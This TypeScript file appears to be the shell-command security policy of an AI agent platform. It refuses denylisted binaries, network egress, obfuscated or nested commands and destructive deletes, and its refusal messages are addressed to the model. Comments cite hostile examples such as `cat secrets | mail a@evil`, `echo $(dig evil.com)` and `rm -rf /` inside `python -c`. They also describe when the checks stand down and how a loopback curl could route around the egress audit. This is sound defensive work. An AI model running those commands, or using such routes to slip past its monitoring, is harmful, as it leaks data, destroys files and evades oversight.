import { homedir } from "node:os";
import type { SecurityDecision } from "../../types.js";
import { USER_HINTS } from "../../types.js";
import type { InlineEvalPolicy, FileAccessMode } from "./types.js";
import { BLOCKED_COMMANDS, BROWSER_OPEN_CMDS, EGRESS_TEXT_PATTERNS, RM_DESTRUCTIVE_FLAGS, SOCKET_PLUMBING_PATTERNS } from "./shell-rules.js";
import { shellLoopbackReachable, shellUnixSocketReachable } from "./loopback-grant.js";
import { inlineProgramDestinations } from "./shell-inline-destinations.js";
import { detectCatastrophicDelete } from "./catastrophic-paths.js";
import { shellDeletes } from "./shell-delete-targets.js";
import { rmInsideWorkspaceVerdict } from "./rm-inside-workspace.js";
import { commandRuleReason, commandRuleRecovery, findCommandRuleHit } from "./shell-command-rules.js";
import { decodeShellEscapes } from "./shell-escape-decode.js";
import {
  detectObfuscation,
  detectSecretPlaceholder,
  detectScriptWrite,
  stripQuotedSpans,
  detectInterpreterEscape,
  detectDangerousInvokeBin,
  detectInlineNetwork,
  detectInlineInterpreterEval,
  detectNestedCommandExecution,
  tokenizeCommand,
} from "./shell-detectors.js";
import { BACKGROUND_REFUSAL, COMPUTED_COMMAND_REFUSAL, NESTED_COMMAND_WAY_OUT, NEWLINE_REFUSAL, SEMICOLON_REFUSAL } from "./shell-refusals.js";
import { isDisposableSandbox } from "./disposable-sandbox.js";
import { readSourceText } from "./shell-source-text.js";
import { runsNestedOutput, splitNestedCommands } from "./shell-nested-commands.js";
import { commandPositions } from "./shell-command-positions.js";

// Re-exported for the existing public surface (importers reference it from
// "./shell-policy.js"); the implementation now lives in shell-detectors.ts.
export { detectObfuscation };

/** First raw-text match in `text`, or null. Returns the MATCHED TEXT so the
 *  deny can name the offending binary instead of a bare "dangerous pattern". */
function firstBlockedCommand(text: string, patterns: readonly RegExp[]): string | null {
  for (const pattern of patterns) {
    const m = pattern.exec(text);
    if (m) return m[0];
  }
  return null;
}

// The denylist deny, told so the model can act on it. Both arms (pipe segment /
// full command) previously returned a bare "matches dangerous pattern" naming
// neither the binary nor a replacement — so the guidance that already exists in
// shell-rules.ts ("the agent should use http_request") never reached the model,
// which retried the same denied `curl` 16 times in three days (measured
// 2026-07-27..29, the single largest shell-deny class on this box after the MSYS
// path bug). Every one of those was curl against 127.0.0.1 — its own server, its
// own dev servers — so the recovery names the loopback case explicitly.
//
// curl to this app's own port stays denied on purpose: several of those calls
// reached external APIs THROUGH this app's own connector proxy
// (/api/connectors/clover/…, /vercel/…), i.e. a loopback curl at that port is a
// live path to arbitrary hosts that skips the egress gate, DNS pinning and the
// audit log. Any other loopback port is granted exactly where http_request may
// reach it (loopback-grant.ts; shell-command-rules.ts reachesOnlyLoopback).
//
// The actionable sentence lives in `reason`, not only `recovery`, because the
// pre-dispatch pack currently drops SecurityDecision.recovery (security-layer-pack)
// — text placed solely in recovery would be dead on that path. `recovery` is set
// too, so it becomes the richer message once that seam carries it.
function deniedCommandBlock(matched: string, scope: "pipe segment" | "command"): SecurityDecision {
  // The first word of the match is the offending binary for every rule in the
  // list (`curl …|` → "curl", `dd …of=` → "dd", `sudo …` → "sudo").
  const bin = matched.trim().split(/\s+/)[0] || matched.trim();
  return {
    allowed: false,
    reason:
      `Blocked: this ${scope} uses "${bin}", which is on the shell denylist. ` +
      `If you need HTTP, use the \`http_request\` tool — it is SSRF-checked, DNS-pinned and audited, and it ` +
      `CAN reach this app's own server and any registered dev server; to download a file, give it save_to. ` +
      `To check that a local port is open, \`nc -z 127.0.0.1 PORT\` is allowed, and a shell client may reach a local port ` +
      `exactly where http_request may, never this app's own port: its API can proxy on to arbitrary external hosts. ` +
      `Retrying the same command will be denied again.`,
    userHint: USER_HINTS.commandShell,
    recovery:
      `Replace "${bin}". For HTTP (including localhost and this app's own API) use \`http_request\`. For a ` +
      `system-administration command (sudo, mkfs, dd, reg, wmic, schtasks) there is no shell path — tell the ` +
      `user what needs doing and why. For reading files use \`read\`; for search use \`grep\`.`,
  };
}

/** The two shapes refused on sight, before any rule reads the command as a
 *  command, so their specific message wins over a generic denylist hit. */
function literalShapeRefusal(command: string): SecurityDecision | null {
  // Secret-placeholder guard: `{{SECRET_NAME}}` only resolves in http_request
  // (into headers, off-argv). In a shell command the braces either pass through
  // literally (opaque downstream failure) or would leak the secret into argv —
  // so refuse the shape and redirect.
  const secretPlaceholder = detectSecretPlaceholder(command);
  if (secretPlaceholder) return { allowed: false, reason: secretPlaceholder, userHint: USER_HINTS.commandShell };
  // Reject launching a URL in the system browser — route to the browser tool
  // (CDP attach + audit) instead, on every bash-spawning path (bash, process_start).
  if (BROWSER_OPEN_CMDS.test(command)) {
    return { allowed: false, reason: "Cannot open URLs in the system browser — use the browser tool instead.", userHint: USER_HINTS.commandShell };
  }
  return null;
}

/** What a shell client may reach on this machine (loopback-grant.ts): the
 *  ports and Unix sockets the rules admit a loopback-only client to. */
const SHELL_LOOPBACK_GRANT = { loopbackReachable: shellLoopbackReachable, unixSocketReachable: shellUnixSocketReachable };

/** Every network destination the command's inline programs name, and those
 *  of the programs its heredocs feed an interpreter, is this machine's own,
 *  and the shell may reach it (loopback-grant.ts). */
function inlineProgramLocal(command: string, heredocPrograms: readonly string[]): boolean {
  const d = inlineProgramDestinations(command, heredocPrograms);
  return d.kind === "local" && d.ports.every(shellLoopbackReachable) && d.unixSockets.every(shellUnixSocketReachable);
}

/** The command separator a bash command chains with outside quotes (newline,
 *  a bare &, ;), refused with the way that works (shell-refusals.ts), or null.
 *  `unquoted` is the command with its quoted spans stripped. */
function separatorRefusal(unquoted: string): string | null {
  if (/[\r\n]/.test(unquoted)) return NEWLINE_REFUSAL;
  if (/(?<![&|<>])&(?![&|>])/.test(unquoted)) return BACKGROUND_REFUSAL;
  if (/;/.test(unquoted)) return SEMICOLON_REFUSAL;
  return null;
}

type Judge = (command: string) => SecurityDecision;

/** The first of `bodies` the policy refuses, its reason saying where it was. */
function firstRefusal(bodies: string[], where: string, judge: Judge): SecurityDecision | null {
  for (const body of bodies) {
    const verdict = judge(body);
    if (!verdict.allowed) return { ...verdict, reason: `${verdict.reason} (in ${where}: ${JSON.stringify(body.slice(0, 120))})` };
  }
  return null;
}

/** Take the nested commands out of `command` (shell-nested-commands.ts) and
 *  judge each as a command of its own: the line left over, or the refusal. */
function judgeNestedCommands(command: string, judge: Judge): { line: string } | { refusal: SecurityDecision } {
  const split = splitNestedCommands(command);
  const refuse = (reason: string) => ({ refusal: { allowed: false, reason, userHint: USER_HINTS.commandShell } });
  if (split.unreadable) return refuse(`Blocked: ${split.unreadable}, so the commands inside it cannot be read. ${NESTED_COMMAND_WAY_OUT}`);
  const refused = firstRefusal(split.bodies, "a nested command", judge);
  if (refused) return { refusal: refused };
  const walk = commandPositions(split.line);
  if (walk.positions.some((p) => runsNestedOutput(p.words))) return refuse(COMPUTED_COMMAND_REFUSAL);
  // A script a shell re-parses (`bash -c '…'`) is quoted, so the split above
  // left it whole: it is judged as the command it is, its own nested commands
  // included.
  const onScript = firstRefusal(walk.scripts, "the script a shell runs", judge);
  if (onScript) return { refusal: onScript };
  return { line: split.line };
}

/** On an unconfined POSIX host, the shapes the string rules are the only wall
 *  against (see the CONFINED-SKIP notes in evaluateShellCommand). */
function hostShapeRefusal(command: string, platform: NodeJS.Platform): string | null {
  if (platform === "win32") {
    // PowerShell: backtick is the escape char, ${} is variable syntax, {} is script blocks — all normal
    // Only block actual dangerous patterns: Invoke-Expression, iex, & (call operator at start)
    return /\r\n/.test(command) ? "Blocked: multi-line commands not allowed." : null;
  }
  // Bash: block arithmetic `$((…))` and parameter `${…}` expansion (host
  // only — relaxed under confinement). Command substitution `$(…)` and
  // backticks are already refused by detectNestedCommandExecution (the
  // negative lookahead there would otherwise skip `$((`, but the broad
  // `\$\(` still catches `$((` on the unconfined host, which is the intent:
  // no kernel cage → keep the expansion FP-block as the boundary). Kept on
  // the RAW command because `$(`/backtick inside DOUBLE quotes are still
  // bash-expanded; a single-quoted occurrence is a rare, harmless FP.
  if (/`/.test(command) || /\$\(/.test(command) || /\$\{/.test(command)) {
    return `Blocked: $(...), \${...} and backticks expand at run time, where the checks cannot follow them on a machine without LAX's sandbox. ${NESTED_COMMAND_WAY_OUT}`;
  }
  // Separators — newline, ;, bare & — count only OUTSIDE quotes, so quote-strip
  // first. A newline or `;` INSIDE a quoted argument (a multi-line
  // `python3 -c 'line1\nline2'` self-test, or the `;` in `python -c "import
  // json; ..."`) is literal string content, not command chaining. Before this
  // was quote-aware, the newline check lived with the backtick check above and
  // blocked EVERY multi-statement inline self-test (mislabeled as command
  // substitution) — so a coding model couldn't run its own multi-line check
  // and shipped unverified, false-done work. An UNQUOTED newline is still a
  // command separator (like ;) and stays blocked.
  // The & exclusions also spare fd-redirect forms — 2>&1, >&2, &>file all carry
  // a literal & that is job-control NOTHING (it's a descriptor dup/merge).
  return separatorRefusal(stripQuotedSpans(command));
}

// Destructive deletes (recursive or forced, every form the delete extractor
// reads: rm, Remove-Item, rd /s, del /f, behind any wrapper and inside a
// `bash -c` body), MODE-AWARE. In unrestricted mode the user has
// granted full-filesystem access, so deleting their OWN files (Downloads,
// Documents, projects, /tmp) via the shell must work — only the catastrophic
// floor (rm -rf /, ~, system dirs → catastrophic-paths.ts) is held, and on a
// disposable machine only its roots. In workspace/common mode a recursive
// delete whose every target is PROVABLY strictly inside the workspace goes on
// to the irreversible floor, which cards it (rm-inside-workspace.ts); anything
// else — and an unthreaded mode or workspace (undefined → fail SAFE) — is
// refused and pointed at delete_file. This is the split-out of the old blanket
// BLOCKED_COMMANDS rm rule that fired regardless of mode. A destructive rm
// SPELLED anywhere in the text (RM_DESTRUCTIVE_FLAGS) is judged too, so the
// confined modes keep refusing one the extractor cannot read: a delete in an
// interpreter's code (`python -c 'os.system("rm -rf /")'`, SHL-004) is no
// command position, and a quote-aware rewrite of an rm scan is the migration
// that lost coverage before.
function destructiveRmRefusal(command: string, fileAccessMode: FileAccessMode | undefined, workspace: string | undefined, platform: NodeJS.Platform): string | null {
  const deletes = shellDeletes(command);
  if (!deletes.some((d) => d.recursive || d.forced) && !RM_DESTRUCTIVE_FLAGS.test(command)) return null;
  if (fileAccessMode === "unrestricted") {
    return detectCatastrophicDelete(deletes, homedir(), platform, { rootsOnly: isDisposableSandbox() });
  }
  const verdict = fileAccessMode ? rmInsideWorkspaceVerdict(command, workspace) : "unprovable";
  if (verdict === "workspace-prefix") {
    return "Blocked: the bash tool already runs inside the workspace, so a `workspace/…` path names a folder that does not exist and this delete would remove nothing. Drop the leading `workspace/` — e.g. `rm -r client-data/build-cache`. Better still, pass the folder to delete_file: it asks the user, then moves the folder to the trash where restore_file can bring it back; a shell delete is permanent.";
  }
  if (verdict !== "inside") {
    return "Blocked: in the current file-access mode `rm -r`/`rm -f` runs only on plain paths inside the workspace (the user is asked to confirm it). This command names a path outside the workspace, the workspace root itself, or a form that cannot be checked (a variable, ~, a glob outside the last path segment, a chained command). To remove a file or a whole folder, use delete_file — it asks the user, then moves it to the trash where restore_file can bring it back.";
  }
  return null;
}

// `inlineEval`/`workspace` gate the R4-11/R4-13 inline-eval interpreter-escape
// refusal: it fires when the policy is "refuse" and needs the workspace tree to
// decide the rename-escape (part b). Both are optional so the redundant
// secondary scan in process-session (which runs AFTER the policy-aware
// evaluateShellCommandAndPaths gate) and the regex-level unit tests keep
// calling with just the command — the canonical bash/process_start path threads
// both through evaluateShellCommandAndPaths. NOTE: this is the inline-eval
// policy, NOT the file-access mode — they are decoupled on purpose so a
// permissive file default can't silently disable this defense.
export function evaluateShellCommand(
  command: string,
  inlineEval?: InlineEvalPolicy,
  workspace?: string,
  fileAccessMode?: FileAccessMode,
  // Injected so tests can pin either platform branch deterministically on any
  // OS. Production callers omit it.
  platform: NodeJS.Platform = process.platform,
  // EFFECTIVE OS-level confinement of THIS spawn: true only when the sandbox
  // backend that will actually wrap the shell is a confined one (guarded
  // seatbelt/bwrap, explicit seatbelt/bwrap, or docker). Callers derive it
  // from getSandboxStatus().confined, which already folds in fallback — a
  // "guarded" SELECTION that fell back to host reports confined=false, so the
  // string rules stay on. Optional so untouched callers/tests fail SAFE
  // (undefined → treated as unconfined → every rule applies).
  sandboxConfined?: boolean,
): SecurityDecision {
  // ── Structural-heuristic switch (see each CONFINED-SKIP comment below) ──
  // Rule groups in this function are best-effort STRING approximations of a
  // process boundary and stand down when the spawn is kernel-confined:
  // script-write, interpreter-escape, the inline-eval form refusal, ARITHMETIC
  // `$((…))` / PARAMETER `${…}` expansion, and command separators (`;`/`&&`/
  // `||`/`&`/newline). When a kernel cage wraps the spawn,
  // everything the command chains / expands / pipes to runs inside the SAME
  // cage, so these regexes add no boundary the kernel doesn't already enforce
  // — while false-blocking legitimate work (`echo $((17+3))`, `a; b`,
  // multi-statement self-tests).
  // Skipped under effective confinement, kept unconfined. win32 never skips:
  // no confined native backend exists there (PowerShell already gets laxer
  // rules; docker-on-Windows isn't worth a semantics split).
  //
  // NOT gated on confinement — these stay on in EVERY mode: obfuscation,
  // {{SECRET}} placeholders, browser-open, BLOCKED_COMMANDS, dangerous-invoke
  // bins, the mode-aware rm rules + catastrophic floor, AND — critically — the
  // nested-command-execution constructs (command substitution `$(…)` (NOT
  // arithmetic `$((`), backticks, subshell `( )`, brace-group `{ ; }`, procsub
  // `<(…)`): their nested argv escapes the argv0 scans, so relaxing them under
  // confinement would open vectors like `echo $(dig evil.com)`. See
  // detectNestedCommandExecution.
  // A machine the operator declared disposable (disposable-sandbox.ts) is its
  // own boundary, so these string heuristics stand down there too; the egress
  // switch below does not, because no cage proxies that machine's network.
  const structuralRulesApply = (sandboxConfined !== true && !isDisposableSandbox()) || platform === "win32";
  // ── Egress switch ──
  // The network rules (the "network-client" argv rule, the inline-network
  // body scan, EGRESS_TEXT_PATTERNS) exist because a host shell can reach any
  // host. A confined spawn cannot: every kernel cage LAX runs (macOS seatbelt,
  // the Linux netns bridge, the Windows fence) leaves only the egress proxy,
  // which applies the network policy. Under one, these rules would refuse
  // `curl https://example.com` that the cage would have routed and judged —
  // so they stand down, on every platform, exactly when the cage holds.
  const egressEnforced = sandboxConfined === true;

  // Escape sequences are read, not refused: the command they spell is judged
  // by every rule below exactly as if it had been typed out. Each decode
  // strictly shortens the text, so a nested encoding bottoms out.
  const decoded = decodeShellEscapes(command);
  if (decoded !== command) {
    const onDecoded = evaluateShellCommand(decoded, inlineEval, workspace, fileAccessMode, platform, sandboxConfined);
    if (!onDecoded.allowed) {
      return {
        ...onDecoded,
        reason: `${onDecoded.reason} (judged on the command its escape sequences spell: ${JSON.stringify(decoded.slice(0, 160))})`,
      };
    }
  }

  // From here the rules judge the command line bash parses: continuations
  // joined and heredoc bodies taken out (shell-source-text.ts), a body a shell
  // will run judged as a command of its own. That reading is exact, so it
  // replaces the raw text; detectScriptWrite still reads the raw text, since it
  // refuses the heredoc form itself. Where the structural rules stand down,
  // each nested command is judged as a command too, and the line keeps only a
  // placeholder for it. Each body is shorter than the command, so this ends.
  const raw = command;
  if (platform !== "win32") {
    const judge: Judge = (body) => evaluateShellCommand(body, inlineEval, workspace, fileAccessMode, platform, sandboxConfined);
    const source = readSourceText(command);
    const onScript = firstRefusal(source.scripts, "the script a heredoc feeds to a shell", judge);
    if (onScript) return onScript;
    command = source.command;
    if (!structuralRulesApply) {
      const nested = judgeNestedCommands(command, judge);
      if ("refusal" in nested) return nested.refusal;
      command = nested.line;
    }
  }

  // Obfuscation detection
  try {
    const obfuscationResult = detectObfuscation(command);
    if (obfuscationResult) {
      return { allowed: false, reason: obfuscationResult, userHint: USER_HINTS.commandShell };
    }
  } catch {
    // Don't crash on obfuscation check failure — allow the command through
  }

  // Secret placeholders and browser-open, refused on sight (literalShapeRefusal).
  const shape = literalShapeRefusal(command);
  if (shape) return shape;

  // Block heredoc + inline-script writes (forces use of write/edit tools).
  // CONFINED-SKIP: the write itself lands inside the kernel cage (and the
  // file-access path guard below still vets every path it can see), so the
  // security value is subsumed; the residual "bash exit 0 ≠ work done"
  // quality nudge doesn't justify false-blocking legit heredoc scripting.
  if (structuralRulesApply) {
    const scriptWriteResult = detectScriptWrite(raw);
    if (scriptWriteResult) {
      return { allowed: false, reason: scriptWriteResult, userHint: USER_HINTS.commandShell };
    }
  }

  // C3-13: argv-aware interpreter-escape (perl/ruby/php inline eval with
  // intervening flags — `perl -w -e`, `ruby -rsocket -e`).
  // CONFINED-SKIP: an inline-eval'd interpreter body executes with exactly
  // the authority of the caged shell that spawned it — no boundary is crossed
  // that the kernel doesn't already hold. Egress from such a body is still
  // caught in every mode by detectInlineNetwork below and by the
  // BLOCKED_COMMANDS backstops (`perl -e`/`ruby -e`/`php -r` bare forms),
  // which stay untouched.
  if (structuralRulesApply) {
    const interpEscape = detectInterpreterEscape(command);
    if (interpEscape) {
      return { allowed: false, reason: interpEscape, userHint: USER_HINTS.commandShell };
    }
  }

  // argv[0]-aware block for dangerous binaries whose names are common argument
  // words (open/host/ping/mount/mail/dig/…). Checked as the invoked command of
  // each pipe segment so `grep host /etc/hosts` passes but `host evil.com` /
  // `cat secrets | mail a@evil` is blocked — replaces the old substring rules
  // that false-positived on those words as arguments.
  const dangerousBin = detectDangerousInvokeBin(command);
  if (dangerousBin) {
    return { allowed: false, reason: dangerousBin, userHint: USER_HINTS.commandShell };
  }

  // Rules on the command being run — every command position, including the
  // bodies nested shells re-parse (shell-command-rules.ts). Always on, except
  // the network rules under an enforced cage (the egress switch above), the
  // detached-session and inline-program form rules where the structural
  // switch stands the shape rules down, and sudo on a server already running
  // as root.
  const ruleHit = findCommandRuleHit(command, { egressEnforced, shapeRulesStandDown: !structuralRulesApply, ...SHELL_LOOPBACK_GRANT });
  if (ruleHit) {
    return { allowed: false, reason: commandRuleReason(ruleHit), userHint: USER_HINTS.commandShell, recovery: commandRuleRecovery(ruleHit) };
  }

  // R4-11/R4-13: refuse the inline-eval interpreter FORM when policy="refuse"
  // (a regex can't soundly vet a Turing-complete `node -e`/`python -c` body,
  // and a renamed interpreter bypasses the basename denylist). Checked BEFORE
  // the body-regex detectInlineNetwork so the specific "write a script file"
  // reason wins. No-op when inlineEval/workspace weren't threaded through, or
  // when policy="allow". Per pipe segment so each argv[0] is inspected.
  // CONFINED-SKIP: the refusal exists because "a regex can't soundly vet a
  // Turing-complete inline body" — under a confined backend we don't NEED to
  // vet it: the kernel cage bounds what the body can do exactly as it would a
  // script file, so the FORM is no longer the risk (this rule alone denied 52
  // legit `python3 -c` self-checks in 7 weeks). detectInlineNetwork below
  // still scans inline bodies for network use in every mode.
  if (structuralRulesApply && inlineEval !== undefined && workspace !== undefined) {
    for (const segment of command.split("|")) {
      const hit = detectInlineInterpreterEval(tokenizeCommand(segment), inlineEval, workspace);
      if (hit) {
        return { allowed: false, reason: hit, userHint: USER_HINTS.commandShell };
      }
    }
  }

  // C3-17: raw socket / low-level network module use inside node -e / python -c
  // (and perl/ruby) inline bodies — the same arbitrary egress as a network CLI,
  // and the same switch: under a cage the body's sockets go where the cage says.
  // Except a program whose every destination is a literal this machine's own
  // that the shell may reach (shell-inline-destinations.ts): checking a local
  // port or talking to a service's control socket from a few lines of Python
  // reaches no farther than a shell client to the same place.
  let local: boolean | undefined;
  const inlineLocal = () => (local ??= inlineProgramLocal(command, platform === "win32" ? [] : readSourceText(raw).programs));
  if (!egressEnforced) {
    const inlineNet = detectInlineNetwork(command);
    if (inlineNet && !inlineLocal()) {
      return { allowed: false, reason: inlineNet, userHint: USER_HINTS.commandShell };
    }
  }

  // POSIX only: nested-command execution — $(...) command sub (but not $(( ))
  // arithmetic / ${} param expansion), backticks, subshell ( ), brace-group
  // { ; }, procsub <(…)/>(…). The argv[0] network/denylist scans can't see a
  // binary invoked inside these (`echo $(dig evil.com)`). Where the structural
  // rules stand down, each was already taken out and judged as a command of
  // its own (judgeNestedCommands, above), so none is left here outside quotes,
  // and a quoted one is literal text or a script judged there as a whole; on
  // an unconfined host they are refused on sight. win32 is excluded: `$(…)`
  // and `( )` are ordinary PowerShell syntax there.
  if (platform !== "win32") {
    const nested = detectNestedCommandExecution(structuralRulesApply ? command : stripQuotedSpans(command));
    if (nested) {
      return { allowed: false, reason: nested, userHint: USER_HINTS.commandShell };
    }
  }

  // Block dangerous shell metacharacters (command chaining + arithmetic/param
  // expansion). Allow: | (pipes, controlled below), > < (redirects), * ? (globs).
  // CONFINED-SKIP (whole platform branch — a no-op for win32, where
  // structuralRulesApply is always true): chaining (unquoted newline / `;` /
  // bare `&`) and expansion (`$((…))` arithmetic, `${…}` params) execute in the
  // SAME confined process tree with the SAME kernel-enforced denials as the
  // outer command — they cross no boundary the cage doesn't hold, and they are
  // exactly the Clover-class false positives (`echo $((17+3))`, `${VAR}`, `a;
  // b`). NOTE: command substitution proper (`$(…)`, backtick) and the other
  // nested-command forms are judged one by one above where these rules stand
  // down, and refused on their own shape by detectNestedCommandExecution
  // on the host, because their nested argv escapes the network/denylist
  // scan. The cross-separator egress rules stay immune too:
  // BLOCKED_COMMANDS + rm scan the raw string, and the argv0 scans segment on
  // ;/&&/||/&/newline (splitShellSegments), so `true; dig evil.com` is caught.
  // Unconfined, these regexes remain the wall (the FP cost is the price of the
  // boundary when there is no kernel cage).
  if (structuralRulesApply) {
    const shape = hostShapeRefusal(command, platform);
    if (shape) return { allowed: false, reason: shape, userHint: USER_HINTS.commandShell };
  }

  // There is no cap on pipeline length. Every stage is a command position the
  // argv rules, the argv0 network/dangerous-bin scans and the raw denylist all
  // read, whatever the count; a sixth stage adds no capability the fifth did
  // not have, and the cap refused 33 real multi-stage build/grep pipelines in
  // two weeks. The nested-command forms whose argv the scans cannot see are
  // judged as commands of their own above, or refused on their own shape.

  const rmRefusal = destructiveRmRefusal(command, fileAccessMode, workspace, platform);
  if (rmRefusal) return { allowed: false, reason: rmRefusal, userHint: USER_HINTS.commandShell };

  // Check every segment of a piped command against blocked patterns, then the
  // full command (which catches patterns that span pipes). ONE reporter for both
  // arms so the two can't drift — they previously returned near-identical bare
  // strings and were edited independently.
  const rawPatterns = egressEnforced ? BLOCKED_COMMANDS : [...BLOCKED_COMMANDS, ...(inlineLocal() ? SOCKET_PLUMBING_PATTERNS : EGRESS_TEXT_PATTERNS)];
  const segments = command.split("|").map((s) => s.trim());
  for (const segment of segments) {
    const hit = firstBlockedCommand(segment, rawPatterns);
    if (hit) return deniedCommandBlock(hit, "pipe segment");
  }
  for (const pattern of rawPatterns) {
    const m = pattern.exec(command);
    if (m) return deniedCommandBlock(m[0], "command");
  }

  return { allowed: true, reason: "Shell command allowed" };
}
